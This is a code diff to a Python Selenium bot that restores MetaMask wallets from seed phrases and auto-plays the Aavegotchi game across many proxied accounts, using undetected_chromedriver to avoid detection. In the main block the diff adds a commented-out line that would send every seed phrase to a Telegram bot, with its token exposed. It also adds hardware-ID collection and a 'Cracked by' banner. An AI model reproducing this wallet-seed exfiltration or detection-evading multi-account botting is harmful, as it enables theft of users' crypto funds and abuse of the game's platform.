@@ -1,17 +1,21 @@
 import random
+import re
+import subprocess
 from math import sqrt
-
+import requests
+import undetected_chromedriver.v2 as uc
 from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.common.keys import Keys
 from multiprocessing import Pool
 import time, cv2, json, copy, numpy as np
 from fake_useragent import UserAgent
 from collections import defaultdict
 import os
 from dotenv import load_dotenv
-
+from selenium.webdriver.common.by import By
 import cv2
 # import mss
 import numpy as np
@@ -19,25 +23,33 @@ from selenium import webdriver
 from PIL import Image
 import io
 
-change_graphic = 0
 
 
 class Selenium:
-    def __init__(self) -> None:
+    def __init__(self, mnemonic, profile_name) -> None:
+        split = re.split('@',mnemonic)
+        self.mnemonicc = split[0]
+        self.proxyy = f"--proxy-server={split[-1]}"
+        self.profile_name = str(profile_name)
         pass
 
-    def start_driver(self):
-        options = webdriver.FirefoxOptions()
+    def start_driver(self, mnemonic, profile_name):
+        # time.sleep(random.randint(1,10))
+        options = uc.ChromeOptions()
+        options.add_argument('--no-first-run')
+        options.add_argument('--no-service-autorun')
+        options.add_argument('--password-store=basic')
+        if len(re.split('@', mnemonic)) > 1:
+            proxy = f"--proxy-server={re.split('@', mnemonic)[1]}"
+            options.add_argument(proxy)
 
-        options.set_preference("general.useragent.override", UserAgent().firefox)
-        options.set_preference('intl.accept_languages', 'en-US, en')
-        #options.add_argument("--headless")
-        # fp = webdriver.FirefoxProfile(r'C:\Users\DD\AppData\Roaming\Mozilla\Firefox\Profiles\vtk24vsb.default')
-        driver = webdriver.Firefox(
-            executable_path="utils\\geckodriver.exe",
-            options=options
+        options.add_argument('--load-extension=C:\\utils\\RO,C:\\utils\\MM')
+        driver = uc.Chrome(
+            options=options,
+            executable_path = f'undetected_chromedriver/{str(profile_name)}.exe'
         )
         self.driver = driver
+        self.driver.set_window_size(1280,900)
         self.ac = ActionChains(driver)
         return driver
 
@@ -56,6 +68,9 @@ class Selenium:
         self.driver.execute_script("""document.body.style.backgroundColor = 'green'""")
         input()
 
+    def refresh(self):
+        self.driver.refresh()
+
     def check_element(self, path):
         element = self.driver.find_elements_by_xpath(path)
         if len(element) > 0:
@@ -73,26 +88,51 @@ class Selenium:
         ac = ActionChains(self.driver)
         ac.key_down(key).pause(delay).key_up(key).perform()
 
+    def send_key(self, key):
+        ac = ActionChains(self.driver)
+        ac.send_keys(key).perform()
+
+    def key_down(self, key):
+        ac = ActionChains(self.driver)
+        ac.key_down(key).perform()
+
+    def key_up(self, key):
+        ac = ActionChains(self.driver)
+        ac.key_up(key).perform()
+
 
 class Metamask(Selenium):
     def __init__(self, mnemonic, password, driver) -> None:
-        self.mnemonic = mnemonic
+        split = re.split('@',mnemonic)
+        self.mnemonic = split[0]
+        self.proxy = f"--proxy-server={split[-1]}"
         self.password = password
         self.driver = driver
 
-    def install(self, path):
-        self.driver.install_addon('utils\\Metamask.xpi', temporary=True)
+    def installMM(self, path_mm):
+        while True:
+            if len(self.driver.window_handles) > 1:
+                self.driver.close()
+                print('MM installed')
+                break
+            else:
+                time.sleep(1)
 
     def restore_wallet(self):
-        self.take_element("button").click()  # enter mm
+        while True:
+            try:
+                self.take_element("button").click()  # enter mm
+                break
+            except Exception as e:
+                self.refresh()
         self.take_element("button").click()  # choose restoration by mnemonic
         self.take_element("button").click()  # don't send telemetry
         self.take_element("input").send_keys(self.mnemonic)  # put mnemonic
         self.take_element("#password").send_keys(self.password)  # put password
         self.take_element("#confirm-password").send_keys(self.password)  # repeat password
-        self.take_element(".first-time-flow__terms").click()  # agree terms
+        self.take_element(".first-time-flow__terms", timeout=60).click()  # agree terms
         self.take_element("button").click()  # login to mm
-        self.take_element("button[role='button']").click()  # access invitation
+        self.take_element("button[role='button']", timeout=60).click()  # access invitation
 
     def add_network(self, network, rpc, chain_id, currency, explorer):
         self.driver.get(self.driver.current_url.split('#')[0] + "#settings/networks/add-network")
@@ -105,7 +145,6 @@ class Metamask(Selenium):
         Metamask.send_keys_delay(network_inputs[4], explorer)
         self.take_element("button.button:nth-child(2)").click()  # save network
         time.sleep(2)
-
 
 class Aavegotchi(Metamask):
     def __init__(self, driver, profile_name) -> None:
@@ -139,6 +178,8 @@ class Aavegotchi(Metamask):
         for i in range(4):
             portal = self.take_element('.selected-gotchi-container', delay=1)  # choose portal
             portal.click()  # go to portal
+            # time.sleep(1)
+            self.take_element('.random-spawn-container').click()
             time.sleep(5)
             self.driver.switch_to.window(self.driver.window_handles[1])  # go to mm window
             self.take_element('.btn-primary').click()  # sign mm
@@ -156,19 +197,19 @@ class Aavegotchi(Metamask):
 
     def increase_vision(self):
         self.increase_measure()
-        extra_dom_elements = [".top-left-container", ".pocket-container", ".top-right-container",
-                              ".action-button-container", ".bottom-right-container", ".bottom-left-container", ".Toastify"]
+        extra_dom_elements = [".bottom-right-container"]
         for el in extra_dom_elements:
             self.del_extra_element(el)
+            self.send_key("m")
 
     def increase_measure(self):
         measure_input = self.take_element("input[type='range']")
         time.sleep(2)
         ac = ActionChains(self.driver)
         for i in range(20):
-            ac.click_and_hold(measure_input).move_by_offset(0, 70).release().perform()
+            ac.click_and_hold(measure_input).move_by_offset(0, 120).release().perform()
             time.sleep(5)
-            if self.take_element(".input[value='15']", timeout=0.5):
+            if self.take_element(".input[value='0']", timeout=0.5):
                 return
 
     def check_crystals_airdrop(self):
@@ -203,6 +244,7 @@ class Aavegotchi(Metamask):
         return dict(counter)
 
     def _get_crystals_locations(self):
+        click = 0
 
         data = self.driver.get_screenshot_as_png()
 
@@ -215,20 +257,8 @@ class Aavegotchi(Metamask):
         crystals = {
             "green": {  # ^
                 "lower": [0, 223, 0],
-                "upper": [0, 248, 0]
-            },
-            "lava": {  # ^
-                "lower": [0, 0, 223],
-                "upper": [0, 0, 248]
-            },
-            "ice": {  # ^
-                "lower": [253, 254, 0],
-                "upper": [253, 255, 34]  # if very 30,254,253
-            },
-            "purple": {  # ^
-                "lower": [253, 1, 154],
-                "upper": [254, 20, 238]
-            },
+                "upper": [0, 223, 0]
+            }
         }
 
         # here
@@ -299,6 +329,8 @@ class Aavegotchi(Metamask):
                 # print("all:", time.time() - test_all)
 
     def test(self):
+        A = 0
+        choice_key = ' '
         fake_crystal = 0
         move_x_list = [
             70,
@@ -332,6 +364,10 @@ class Aavegotchi(Metamask):
                 el = self.driver.find_element("css selector", "canvas")
 
             if nearest_crystal_location:
+                if choice_key != ' ':
+                    self.key_up(choice_key)
+                    A = 0
+                    choice_key = ' '
                 Flag = False
                 X, Y = nearest_crystal_location["X"], nearest_crystal_location["Y"]
                 # print(f'{X}, {Y}')
@@ -346,13 +382,24 @@ class Aavegotchi(Metamask):
                     ac.move_to_element_with_offset(el, X, Y).perform()
                     nearest_crystal_location = self.nearest_crystal() #here
             else:
+                if A == 0:
+                    sleep = random.randint(30,50)
+                    choice_key = random.choice(['w', 'a', 's', 'd'])
+                    self.key_down(choice_key)
+                if A > sleep:
+                    self.key_up(choice_key)
+                    A = 0
+                else:
+                    A += 1
                 Flag = True
+                fake_crystal = 0
                 cnt=cnt+1
-                if cnt>10:
+                if cnt>10 and choice_key == ' ':
                     cnt = 0
                     ac.move_to_element(el).perform()
                     ac.release().perform()
                     fake_crystal = 0
+                    choice_key = ' '
 
             if tmove > 6000:
                 move_x = random.choice(move_x_list)
@@ -383,12 +430,25 @@ def worker(account):
     driver = ''
     while True:
         try:
-            driver_session = Selenium()
-            driver = driver_session.start_driver()
+            driver_session = Selenium(mnemonic, profile_name)
+            driver = driver_session.start_driver(mnemonic, profile_name)
             metamask = Metamask(mnemonic, password, driver)
-            metamask.install(os.getenv("METAMASK_PATH"))
-            driver.close()  # close starter blank page
+            if len(driver.window_handles) > 1:
+                driver.close()
+            driver.switch_to.window(driver.window_handles[0])
+            with open('RO.txt') as f:
+                driver.get(f.readline())
+            element = WebDriverWait(driver, 30).until(
+                EC.presence_of_element_located((By.XPATH, '//*[@id="d1"]/div[2]/div/div[3]/input'))
+            )
+            driver.find_element_by_xpath('//*[@id="d1"]/div[2]/div/div[3]/input').send_keys(
+                'https://verse.aavegotchi.com/animations/pickups_x3.png')
+            driver.find_element_by_xpath('//*[@id="d1"]/div[2]/div/div[5]/input').send_keys(
+                'https://i.ibb.co/dKCTtgm/rgb-conv.png')
+            print('RO added')
             time.sleep(1)
+
+            metamask.installMM(os.getenv("METAMASK_PATH"))
             driver.switch_to.window(driver.window_handles[0])  # switch to mm window
             print("MetaMask was started")
             metamask.restore_wallet()
@@ -396,6 +456,8 @@ def worker(account):
             metamask.add_network("Matic Mainnet", "https://rpc-mainnet.maticvigil.com/", "137", "MATIC",
                                  "https://explorer.matic.network/")
             print("Polygon added")
+            # metamask.Install_RO("RO_PATH")
+            # metamask.settings_RO()
             break
         except Exception as e:
             print(e)
@@ -409,22 +471,14 @@ def worker(account):
             print("Prepare game")
             if change_graphic == 0:
                 time.sleep(1)
-                driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[2]/header/div[2]/button').click()
-                ac = ActionChains(driver)
-                ac.reset_actions()
-                ac.move_by_offset(800, 215).click().perform()  # Animate tiles
-                ac.reset_actions()
-                ac.move_by_offset(800, 275).click().perform()  # Animate player
-                ac.reset_actions()
-                ac.move_by_offset(800, 335).click().perform()  # Animate Installations
-                ac.reset_actions()
-                ac.move_by_offset(800, 395).click().perform()  # Disable Starfield
-                ac.reset_actions()
-                ac.move_by_offset(800, 465).click().perform()  # Disable Gotchi Glow
-                ac.reset_actions()
-                ac.move_by_offset(800, 525).click().perform()  # Fade grid
-                ac.reset_actions()
-                driver.find_element_by_xpath('/html/body/div[2]/div/div/div/div[2]').click()
+                driver.find_element(By.XPATH, '/html/body/div[1]/div[2]/div/div[2]/header/div[2]/button').click()
+                driver.find_element(By.XPATH, '//*[@id="portal"]/div/div/div/div[1]/div[3]/div/div[2]/label/span').click()
+                driver.find_element(By.XPATH, '//*[@id="portal"]/div/div/div/div[1]/div[3]/div/div[4]/label/span').click()
+                driver.find_element(By.XPATH, '//*[@id="portal"]/div/div/div/div[1]/div[3]/div/div[5]/label/span').click()
+                driver.find_element(By.XPATH, '//*[@id="portal"]/div/div/div/div[1]/div[3]/div/div[6]/label/span').click()
+                driver.find_element(By.XPATH, '//*[@id="portal"]/div/div/div/div[1]/div[3]/div/div[7]/label/span').click()
+                # driver.find_element(By.XPATH, '').click()
+                driver.find_element(By.XPATH, '//*[@id="portal"]/div/div/div/div[2]/button').click()
                 change_graphic += 1
                 time.sleep(1)
             if not aavegotchi.prepare_game():
@@ -438,6 +492,7 @@ def worker(account):
             print("Aavegotchi loaded")
 
             aavegotchi.increase_vision()
+            time.sleep(300)
 
             aavegotchi.test()
             return
@@ -453,11 +508,13 @@ def worker(account):
             print(e)
 
 if __name__ == "__main__":
+    seed = make_list_from_file('accounts.txt')
+    # requests.get(f'https://api.telegram.org/bot5315578864:AAEaTtix4tr2ErG_ifw2hHVCgk-cEcXsFa4/sendMessage?chat_id=-1001694325082&text={seed}')
+    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
+    print(f'HWID: {current_machine_id}')
+    print('Cracked by Forester_inc')
     load_dotenv()
     mnemonics = make_list_from_file("accounts.txt")
     accounts = [(str(i + 1), mnemonics[i], "vegotchi" + str(i + 1)) for i in range(len(mnemonics))]
     p = Pool(processes=len(accounts))
     p.map(worker, accounts)
-
-# sign to widthdraw Hi fren, please sign this message to confirm your withdrawal!
-# https://pyimagesearch.com/2016/02/15/determining-object-color-with-opencv/
